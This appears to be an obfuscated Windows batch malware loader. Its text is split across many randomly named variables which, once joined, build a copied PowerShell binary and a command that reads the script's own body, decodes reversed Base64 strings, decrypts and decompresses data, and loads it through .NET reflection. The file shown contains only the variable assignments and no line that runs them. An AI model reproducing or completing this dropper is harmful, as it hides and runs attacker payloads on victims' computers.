@echo off
set "hAYdzLeCYD=ws"
set "RGhXWutgqs=st"
set "xPsaZUZHrm=\v"
set "TvWtuxWLZo=\W"
set "khHXjzXdNz=he"
set "qTpnSGSuBR=xe"
set "TYDLSyprEe=Wi"
set "dYMLlMKxMs= /"
set "lzFxuArnul=ow"
set "dUiHkxTftU=do"
set "EKViXMhJXp=he"
set "cyBuTPrUjc=po"
set "RErUvdJRat=0\"
set "XzxHofyXCx=1."
set "qFBFIaAQRb= C"
set "ODNzJrlGDu=ll"
set "LrNyKVVtYT=Po"
set "NzsLrbczlZ=we"
set "hbWsaHdMNJ=em"
set "deJWJsbPMk=s\"
set "HSUkTaAGUE=y "
set "LjmNpgHVra=Sy"
set "YVyudJmTMI=in"
set "TqrsTbgtlh=:\"
set "EQrfhxXvVr=rS"
set "QuNcDcmShn=32"
set "bkGadEBfKa=.e"
set "QJGomkyUeC=py"
set "BAgAeNvyTA=ll"
set "LMJwbSjAmo=nd"
set "PtfzjYnojX=we"
set "yLfUpLqxyn=co"
set "pyWwJTyyEV=rs"
set "qiRfxytzSK=cd"
set "nIyBKPlDqA= %~dp0"
set "CyIjAkfxBa=] -j"
set "FQBTahWDyw=le  "
set "rfwOcENupz=esMa"
set "EImcoNyvjw=flec"
set "EZDkdfmAjg=onve"
set "TpqGpHfhEn=ert]"
set "gCwmSwltLS=BC;$"
set "sUMyPZqqTG=sGUc"
set "YLCLWkzGYQ=('%~f0'"
set "cLKPHHLCay=join"
set "zSPvVmWSBd=YDJO"
set "eQAcDdSjPa=null"
set "RrnoWwgSXD=.Cry"
set "JmucrUegSh=  $R"
set "ajzDxHUsos=ach "
set "ZkSqbdAjWH= '')"
set "vIHeSpljDG=gnir"
set "NBzWViqbGl=Invo"
set "ZItxjEDZJS=NYs."
set "raRljrFDgy=AdqK"
set "jxTlWuMRPv=pStr"
set "gsKgdARMNi= = ["
set "LFEQtqecMG=-nop"
set "aLzIMtwPQS=pose"
set "sNCoJvKIWn=eam("
set "ofdhuDmutL=Kr, "
set "zRGzTTPWGu=m(, "
set "RgZygFrbfv=-Obj"
set "dtKvFJgYwe= '')"
set "TJhWszsyeV=);$j"
set "wvkIfYeJwy=daeR"
set "uXalNVYMBn=p.En"
set "wPQBiatopU=[Sys"
set "FqllPActlc=]::N"
set "RNvgwJjEiV=IAoQ"
set "XkcxOmsbhg=m.Re"
set "frUFKzqLym=MIAo"
set "AunatDalNY=);$M"
set "QuoNmRSnSK=m.IO"
set "OqcagMnwPv=F'[-"
set "WkLQYcmmqb=em.I"
set "lIjssjWTwb=IAoQ"
set "tkvNZTELQa=M, 0"
set "SwKfFwlmzW=embl"
set "CqYcPONFJS=.Com"
set "uZGYFmAjZG=ment"
set "mtSYymkvej=Stre"
set "AQFkjkHmNa=morF"
set "XfgGKvjfEx=$wMv"
set "gyXQJYDcCT=fore"
set "QFfRlDmiSQ=[IO."
set "ufFkMyTtau=.Dis"
set "krjOIUAXHY=l) {"
set "kdHhMdETGe=Disp"
set "zXpxfSvcCh=.Cre"
set "EJtdpErKem=M = "
set "muOqXoWYQD=New-"
set "nVkeiZOgmb=XM ="
set "qOKiGpzsFw=($Ua"
set "DEgHRnXrBj=1..-"
set "GTxwYKRjob=O.Me"
set "BSaFOXbxtR=ring"
set "phmGlNnkIB=[]] "
set "LQGRrUeDvt=);$M"
set "pkMCUrDmND=rt]:"
set "HbTaTrvfMI=Igk "
set "BgNdwbrluI=y.Ci"
set "OuaxyVDXMN=ress"
set "kLRadZiLBV=]::("
set "gvKdnimIYe=)) {"
set "dmudJrMZIO=vcZJ"
set "TocvymLhLU===')"
set "CFLrMFogTm=();$"
set "AbHEOPCtOi=pose"
set "nirGAqmCvM=rFZ."
set "DDNDQhSyyE=pher"
set "vVHrClqYQi=isfL"
set "NHkxECgFIB=oL'["
set "FdmBlluXUa= New"
set "IEmTqAMJiH=form"
set "BKwvSbkUHP=Fo7l"
set "rCDPucYMtE=();$"
set "bTxGDLpeXp=nirt"
set "xXGmGhXzKF=IAoQ"
set "rSsfBzZgkl=$Adq"
set "QAWEGrOXdx=MvXM"
set "BwAwQBdQWV=1] -"
set "ZeARCfhttd=, (,"
set "AwffdpLUkZ=New-"
set "GZdPsyNEdc='[-1"
set "kbzjnIiXSk=MvXM"
set "wQjqIHTdFA=ing("
